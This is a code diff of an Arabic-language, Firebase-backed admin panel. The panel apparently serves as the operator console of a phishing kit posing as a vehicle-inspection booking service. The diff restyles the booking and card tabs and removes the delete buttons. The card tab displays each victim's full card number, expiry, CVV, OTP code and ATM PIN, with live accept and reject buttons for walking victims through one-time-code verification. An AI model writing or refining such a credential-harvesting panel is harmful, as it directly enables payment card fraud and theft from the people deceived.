@@ -21,19 +21,32 @@
         .container { padding: 15px; }
         .tab-content { display: none; }
         .tab-content.active { display: block; }
-        .booking-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px; }
-        .customer-card { background: white; border-radius: 12px; padding: 15px; border-right: 6px solid #1e7344; box-shadow: 0 4px 6px rgba(0,0,0,0.05); }
-        .operation-row { background: white; border-radius: 10px; padding: 10px; margin-bottom: 10px; border: 1px solid #ddd; box-shadow: 0 2px 4px rgba(0,0,0,0.03); }
-        .card-data-wrapper { display: flex; align-items: center; justify-content: space-between; gap: 10px; flex-wrap: nowrap; }
-        .box { padding: 8px 10px; border-radius: 6px; font-size: 13px; background: #f8f9fa; border: 1px solid #eee; text-align: center; }
-        .card-box { background: #fffcf0; border-color: #fcebb6; color: #856404; font-weight: bold; }
-        .status-badge { padding: 2px 8px; border-radius: 10px; font-size: 11px; font-weight: bold; }
+        
+        /* تنسيق كروت البيانات */
+        .operation-row { background: white; border-radius: 12px; padding: 15px; margin-bottom: 15px; border: 1px solid #ddd; box-shadow: 0 4px 6px rgba(0,0,0,0.05); border-right: 8px solid #1e7344; }
+        .card-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #eee; padding-bottom: 10px; margin-bottom: 10px; }
+        .customer-name { font-weight: bold; color: #1e7344; font-size: 16px; }
+        
+        .data-grid { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 15px; }
+        .info-box { background: #f8f9fa; border: 1px solid #e9ecef; padding: 10px; border-radius: 8px; min-width: 120px; text-align: center; }
+        .info-label { display: block; font-size: 11px; color: #666; margin-bottom: 4px; font-weight: bold; }
+        .info-value { display: block; font-size: 14px; color: #333; font-weight: bold; }
+        
+        .card-highlight { background: #fffcf0; border-color: #fcebb6; }
+        .otp-box { background: #e3f2fd; border-color: #bbdefb; }
+        .pin-box { background: #f3e5f5; border-color: #e1bee7; }
+        
+        .actions-area { display: flex; gap: 10px; }
+        .btn { flex: 1; padding: 10px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; color: white; transition: 0.3s; }
+        .btn-accept { background: #28a745; }
+        .btn-accept:hover { background: #218838; }
+        .btn-reject { background: #dc3545; }
+        .btn-reject:hover { background: #c82333; }
+        
+        .status-badge { padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: bold; }
         .status-waiting { background: #fff3cd; color: #856404; animation: blink 1s infinite; }
         @keyframes blink { 50% { opacity: 0.5; } }
-        .btn { padding: 6px 12px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; color: white; font-size: 12px; }
-        .btn-accept { background: #28a745; }
-        .btn-reject { background: #dc3545; }
-        .btn-delete { background: #6c757d; }
+        
         .logout-btn { background: #000 !important; margin-top: 10px; font-size: 12px; }
     </style>
 </head>
@@ -52,13 +65,13 @@
 <div id="adminContent">
     <div class="visitor-counter">المتواجدون الآن: <span id="onlineCount">0</span> 🌐</div>
     <div class="navbar">
-        <button class="nav-btn active" onclick="openTab(event, 'bookingSection')">👤 بيانات الحجز</button>
-        <button class="nav-btn" onclick="openTab(event, 'cardsSection')">💳 بيانات البطاقات</button>
+        <button class="nav-btn active" onclick="openTab(event, 'bookingSection')">👤 الحجوزات</button>
+        <button class="nav-btn" onclick="openTab(event, 'cardsSection')">💳 البطاقات</button>
         <button class="nav-btn logout-btn" onclick="logout()">🚪 خروج</button>
     </div>
     <div class="container">
         <div id="bookingSection" class="tab-content active">
-            <div id="bookingGrid" class="booking-grid"></div>
+            <div id="bookingGrid"></div>
         </div>
         <div id="cardsSection" class="tab-content">
             <div id="paymentsContainer"></div>
@@ -104,7 +117,7 @@
         if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        // 1. عداد الزوار - تصفير تلقائي للقديم عشان يظهر 0 لو مفيش حد
+        // عداد الزوار
         database.ref('live_visitors').on('value', s => {
             let active = 0; const now = Date.now();
             s.forEach(c => {
@@ -114,23 +127,27 @@
             document.getElementById('onlineCount').innerText = active;
         });
 
-        // 2. بيانات الحجوزات - وضعنا child_added للسرعة
+        // بيانات الحجوزات
         database.ref('visitors').on('child_added', (snapshot) => {
             const val = snapshot.val();
             const grid = document.getElementById('bookingGrid');
-            const card = document.createElement('div');
-            card.className = 'customer-card';
-            card.id = 'v_' + snapshot.key;
-            card.innerHTML = `
-                <h3 style="margin:0 0 10px 0; color:#1e7344; font-size:16px;">${val.fullName || 'زائر'}</h3>
-                <p style="font-size:13px; margin:5px 0;">🚗 ${val.vehicleType || '-'} | 🔢 ${val.plateNumber || '-'}</p>
-                <p style="font-size:13px; margin:5px 0;">📅 ${val.bookingDate || '-'} | 🕒 ${val.bookingTime || '-'}</p>
-                <button class="btn btn-reject" style="width:100%; margin-top:10px;" onclick="deleteData('visitors/${snapshot.key}')">حذف</button>
+            const row = document.createElement('div');
+            row.className = 'operation-row';
+            row.innerHTML = `
+                <div class="card-header">
+                    <span class="customer-name">${val.fullName || 'زائر جديد'}</span>
+                </div>
+                <div class="data-grid">
+                    <div class="info-box"><span class="info-label">نوع السيارة</span><span class="info-value">${val.vehicleType || '-'}</span></div>
+                    <div class="info-box"><span class="info-label">رقم اللوحة</span><span class="info-value">${val.plateNumber || '-'}</span></div>
+                    <div class="info-box"><span class="info-label">التاريخ</span><span class="info-value">${val.bookingDate || '-'}</span></div>
+                    <div class="info-box"><span class="info-label">الوقت</span><span class="info-value">${val.bookingTime || '-'}</span></div>
+                </div>
             `;
-            grid.prepend(card);
+            grid.prepend(row);
         });
 
-        // 3. بيانات البطاقات - كامل الأزرار (قبول / رفض / حذف)
+        // بيانات البطاقات (تنسيق منظم جداً)
         database.ref('payments').on('child_added', (snapshot) => {
             const val = snapshot.val();
             const container = document.getElementById('paymentsContainer');
@@ -146,52 +163,37 @@
             }
 
             row.innerHTML = `
-                <div class="card-data-wrapper">
-                    <div style="min-width:100px;">
-                        <div style="font-weight:bold; font-size:13px;">${val.cardHolder || 'عميل'}</div>
-                        <span id="stat_${snapshot.key}" class="status-badge ${statusClass}">${statusText}</span>
-                    </div>
-                    <div style="display:flex; gap:5px; align-items:center; flex-grow:1; flex-wrap:nowrap;">
-                        <div class="box card-box" style="direction:ltr; min-width:140px;">${val.cardNumber || '----'}</div>
-                        <div class="box card-box">${val.expiry || '--/--'} | ${val.cvv || '---'}</div>
-                        <div class="box" style="background:#e3f2fd; color:#0d47a1;">🔐 OTP: ${val.otp || '-'}</div>
-                        <div class="box" style="background:#f3e5f5; color:#4a148c;">🏧 PIN: ${val.atm_pin || '-'}</div>
-                    </div>
-                    <div style="display:flex; gap:5px;">
-                        <button class="btn btn-accept" onclick="updateStatus('${snapshot.key}', 'accept')">قبول</button>
-                        <button class="btn btn-reject" onclick="updateStatus('${snapshot.key}', 'reject')">رفض</button>
-                        <button class="btn btn-delete" onclick="deleteData('payments/${snapshot.key}')">🗑</button>
-                    </div>
+                <div class="card-header">
+                    <span class="customer-name">${val.cardHolder || 'عميل'}</span>
+                    <span id="stat_${snapshot.key}" class="status-badge ${statusClass}">${statusText}</span>
+                </div>
+                <div class="data-grid">
+                    <div class="info-box card-highlight"><span class="info-label">رقم البطاقة</span><span class="info-value" style="letter-spacing:1px;">${val.cardNumber || '----'}</span></div>
+                    <div class="info-box card-highlight"><span class="info-label">انتهاء (YY/MM)</span><span class="info-value">${val.expiry || '--/--'}</span></div>
+                    <div class="info-box card-highlight"><span class="info-label">CVV</span><span class="info-value">${val.cvv || '---'}</span></div>
+                    <div class="info-box otp-box"><span class="info-label">كود OTP</span><span class="info-value">${val.otp || '-'}</span></div>
+                    <div class="info-box pin-box"><span class="info-label">رقم PIN</span><span class="info-value">${val.atm_pin || '-'}</span></div>
+                </div>
+                <div class="actions-area">
+                    <button class="btn btn-accept" onclick="updateStatus('${snapshot.key}', 'accept')">قبول الطلب</button>
+                    <button class="btn btn-reject" onclick="updateStatus('${snapshot.key}', 'reject')">رفض الطلب</button>
                 </div>
             `;
             container.prepend(row);
         });
 
-        // تحديث الحالة لحظياً (لو دوست قبول أو رفض يتغير اللون فوراً)
+        // تحديث الحالة
         database.ref('payments').on('child_changed', (snapshot) => {
             const val = snapshot.val();
             const badge = document.getElementById('stat_' + snapshot.key);
             if (badge) {
-                if (val.status === 'accept') { 
-                    badge.innerText = "مقبول ✅"; 
-                    badge.className = "status-badge"; 
-                    badge.style.background = "#d4edda"; 
-                }
-                else if (val.status === 'reject') { 
-                    badge.innerText = "مرفوض ❌"; 
-                    badge.className = "status-badge"; 
-                    badge.style.background = "#f8d7da"; 
-                }
+                if (val.status === 'accept') { badge.innerText = "مقبول ✅"; badge.className = "status-badge"; badge.style.background = "#d4edda"; }
+                else if (val.status === 'reject') { badge.innerText = "مرفوض ❌"; badge.className = "status-badge"; badge.style.background = "#f8d7da"; }
             }
         });
-
-        // الحذف اللحظي من الشاشة عند المسح من القاعدة
-        database.ref('visitors').on('child_removed', s => document.getElementById('v_'+s.key)?.remove());
-        database.ref('payments').on('child_removed', s => document.getElementById('p_'+s.key)?.remove());
     }
 
     function updateStatus(id, action) { firebase.database().ref('payments/' + id).update({ status: action }); }
-    function deleteData(path) { if(confirm('متأكد؟')) firebase.database().ref(path).remove(); }
 
     function openTab(evt, tabName) {
         document.querySelectorAll(".tab-content").forEach(t => t.style.display = "none");
